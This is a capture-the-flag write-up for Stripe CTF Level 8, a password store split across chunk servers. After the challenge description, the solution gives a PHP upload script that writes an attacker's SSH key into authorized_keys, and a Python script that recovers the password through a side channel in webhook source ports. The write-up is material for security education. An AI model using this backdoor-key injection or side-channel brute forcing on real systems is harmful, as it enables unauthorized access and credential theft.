## Level 8

Welcome to the final level, Level 8.

HINT 1: No, really, we're not looking for a timing attack.

HINT 2: Running the server locally is probably a good place to start. Anything interesting in the output?

UPDATE: If you push the reset button, you will be bounced to a new `level08` machine. Note that this will change the value of your Flag. If you push reset on Level 2, you will similarly be bounced to a new Level 2 machine, but your Flag won't change.

Because password theft has become such a rampant problem, a security firm has decided to create PasswordDB, a new and secure way of storing and validating passwords. You've recently learned that the Flag itself is protected in a PasswordDB instance, accesible at https://level08-1.stripe-ctf.com/user-xxxxxxxxxx/.

PasswordDB exposes a simple JSON API. You just POST a payload of the form `{"password": "password-to-check", "webhooks": ["mysite.com:3000", ...]}` to PasswordDB, which will respond with a `{"success": true}` or `{"success": false}` to you and your specified webhook endpoints.

(For example, try running `curl https://level08-1.stripe-ctf.com/user-xxxxxxxxxx/ -d '{"password": "password-to-check", "webhooks": []}'`.)

In PasswordDB, the password is never stored in a single location or process, making it the bane of attackers' respective existences. Instead, the password is "chunked" across multiple processes, called "chunk servers". These may live on the same machine as the HTTP-accepting "primary server", or for added security may live on a different machine. PasswordDB comes with built-in security features such as timing attack prevention and protection against using unequitable amounts of CPU time (relative to other PasswordDB instances on the same machine).

As a secure cherry on top, the machine hosting the primary server has very locked down network access. It can only make outbound requests to other `stripe-ctf.com` servers. As you learned in Level 5, someone forgot to internally firewall off the high ports from the Level 2 server. (It's almost like someone on the inside is helping you — there's an [sshd](http://linux.about.com/od/commands/l/blcmdl8_sshd.htm) running on the Level 2 server as well.)

To maximize adoption, usability is also a goal of PasswordDB. Hence a launcher script, `password_db_launcher`, has been created for the express purpose of securing the Flag. It validates that your password looks like a valid Flag and automatically spins up 4 chunk servers and a primary server.

You can obtain the code for PasswordDB from `git clone https://level08-1.stripe-ctf.com/user-xxxxxxxxxx/level08-code`.

### Running

- Run password_db_launcher. For example:

    `./password_db_launcher 123456789012 127.0.0.1:3000`

  will start a PasswordDB instance running on 127.0.0.1:3000 and with the Flag set to `123456789012`

- Make sure you're using Twisted 11.1.0
- Connect using curl:

    `curl 127.0.0.1:3000 -d '{"password": 123456789012, "webhooks": []}'`

### Solution

First, gain SSH access to a `*.stripe-ctf.com` machine by uploading the following PHP script to your `level02` endpoint:

```php
#!/usr/bin/env php
<?php
$dir = exec("pwd");
mkdir("$dir/../../.ssh");
$file = fopen("$dir/../../.ssh/authorized_keys", "w");
fputs($file, "ssh-dss <your-public-key>");
fclose($file);
```

After logging into your `level02` machine as `user-xxxxxxxxxx`, run the following Python script:

```python
#!/usr/bin/env python 
import socket
import urllib
import json
import sys

port = 12121

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', port))
sock.listen(5)

last_port = 0

def resolve_chunk(sock, port_offset, known = ""):
  candidates, last_port = range(0, 1000), 0
  while len(candidates) > 1:
    next_candidates = []
    for candidate in candidates:
      password = ("%s%03d" % (known, candidate)).ljust(12, "0");
      params = '{"password": "%s", "webhooks": ["level02-1.stripe-ctf.com:%d"]}' % (password, port)
      response = urllib.urlopen("https://level08-1.stripe-ctf.com/user-xxxxxxxxxx/", params)
      result = json.loads(response.read())['success']
      if result:
        print password
        sys.exit()

      client, address = sock.accept()
      data = client.recv(1024)
      port_diff = address[1] - last_port
      if port_diff >= port_offset:
        next_candidates.append(candidate)
      last_port = address[1]
    candidates = next_candidates
  return str(candidates[0])

known = resolve_chunk(sock, 4)
known += resolve_chunk(sock, 5, known)
known += resolve_chunk(sock, 6, known)
known += resolve_chunk(sock, 7, known)
print known
```

Originally posted at [https://stripe-ctf.com/levels/8](https://stripe-ctf.com/levels/8).
